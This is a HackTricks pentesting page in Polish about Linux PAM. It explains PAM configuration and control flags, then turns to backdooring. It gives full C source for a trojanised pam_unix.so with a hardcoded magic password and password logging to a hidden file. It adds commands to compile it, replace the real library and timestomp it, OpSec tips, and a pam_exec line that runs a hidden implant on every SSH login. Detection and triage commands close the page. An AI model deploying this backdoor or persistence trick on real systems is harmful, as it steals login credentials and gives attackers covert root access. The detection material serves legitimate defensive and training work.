# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Podstawowe informacje

**PAM (Pluggable Authentication Modules)** działa jako mechanizm bezpieczeństwa, który **weryfikuje tożsamość użytkowników próbujących uzyskać dostęp do usług komputerowych**, kontrolując ich dostęp na podstawie różnych kryteriów. To coś w rodzaju cyfrowego stróża bramy, zapewniającego, że tylko uprawnieni użytkownicy mogą korzystać z określonych usług, jednocześnie ewentualnie ograniczając ich użycie, aby zapobiec przeciążeniu systemu.

#### Pliki konfiguracyjne

- **Solaris and UNIX-based systems** zazwyczaj wykorzystują centralny plik konfiguracyjny znajdujący się w `/etc/pam.conf`.
- **Linux systems** preferują podejście oparte na katalogach, przechowując konfiguracje specyficzne dla usług w `/etc/pam.d`. Na przykład plik konfiguracyjny dla usługi login znajduje się w `/etc/pam.d/login`.

An example of a PAM configuration for the login service might look like this:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Obszary zarządzania PAM**

Te obszary, czyli grupy zarządzania, obejmują **auth**, **account**, **password** i **session**, z których każdy odpowiada za inny aspekt procesu uwierzytelniania i zarządzania sesją:

- **Auth**: Weryfikuje tożsamość użytkownika, często prosząc o hasło.
- **Account**: Zajmuje się weryfikacją konta, sprawdzając warunki takie jak członkostwo w grupie lub ograniczenia czasowe dostępu.
- **Password**: Zarządza zmianami haseł, w tym sprawdzaniem złożoności lub zapobieganiem atakom słownikowym.
- **Session**: Zarządza działaniami podczas rozpoczęcia lub zakończenia sesji usługi, takimi jak montowanie katalogów czy ustawianie limitów zasobów.

#### **Kontrola modułów PAM**

Kontrolki określają reakcję modułu na sukces lub porażkę, wpływając na ogólny proces uwierzytelniania. Należą do nich:

- **Required**: Niepowodzenie modułu oznaczonego jako required prowadzi do ostatecznej porażki, ale dopiero po sprawdzeniu wszystkich kolejnych modułów.
- **Requisite**: Natychmiastowe przerwanie procesu w przypadku porażki.
- **Sufficient**: Sukces powoduje ominięcie pozostałych sprawdzeń w tym samym obszarze, chyba że następny moduł zakończy się niepowodzeniem.
- **Optional**: Powoduje porażkę tylko wtedy, gdy jest jedynym modułem na stosie.

#### Przykładowy scenariusz

W konfiguracji z wieloma modułami auth proces przebiega w ścisłej kolejności. Jeśli moduł `pam_securetty` uzna terminal logowania za nieautoryzowany, logowania roota są zablokowane, lecz wszystkie moduły nadal są przetwarzane z powodu jego statusu "required". Moduł `pam_env` ustawia zmienne środowiskowe, co może poprawić doświadczenie użytkownika. Moduły `pam_ldap` i `pam_unix` współpracują przy uwierzytelnianiu użytkownika; `pam_unix` próbuje użyć wcześniej podanego hasła, zwiększając wydajność i elastyczność metod uwierzytelniania.


## Backdooring PAM – Hooking `pam_unix.so`

A classic persistence trick in high-value Linux environments is to **swap the legitimate PAM library with a trojanised drop-in**.  Because every SSH / console login ends up calling `pam_unix.so:pam_sm_authenticate()`, a few lines of C are enough to capture credentials or implement a *magiczne* password bypass.

### Krótka ściągawka kompilacji
<details>
<summary>Przykładowy `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Kompiluj i stealth-replace:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Wskazówki OpSec
1. **Atomic overwrite** – zapisz do pliku tymczasowego i `mv` na miejsce, aby uniknąć pół-zapisanych bibliotek, które mogłyby zablokować dostęp przez SSH.
2. Umiejscowienie pliku logów, np. `/usr/bin/.dbus.log`, wtapia się w prawdziwe artefakty pulpitu.
3. Utrzymuj eksporty symboli identyczne (`pam_sm_setcred`, itd.), aby uniknąć niewłaściwego działania PAM.

### Wykrywanie
* Porównaj MD5/SHA256 `pam_unix.so` z pakietem dystrybucji.
* `rpm -V pam` lub `debsums -s libpam-modules` aby wykryć podmienione biblioteki bez ręcznego hashowania.
* Sprawdź obecność plików zapisywalnych dla wszystkich lub nietypowej własności w katalogu `/lib/security/`.
* Reguła auditd: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Przeszukaj konfiguracje PAM w poszukiwaniu nieoczekiwanych modułów: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Szybkie polecenia triage (po kompromitacji lub podczas threat huntingu)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Wykorzystywanie `pam_exec` do utrzymania dostępu
Zamiast zastępować `pam_unix.so`, delikatniejszym rozwiązaniem jest dopisanie linii `pam_exec` do `/etc/pam.d/sshd`, dzięki czemu każde logowanie przez SSH uruchomi implant, przy jednoczesnym pozostawieniu normalnego stosu nienaruszonego:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` działa jako root w kontekście PAM sshd, więc skrypt może uruchamiać reverse shells, zbierać env vars lub ponownie otwierać implantowane gniazda bez dokonywania zmian w systemie plików ani w kluczowych bibliotekach.


## Źródła

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
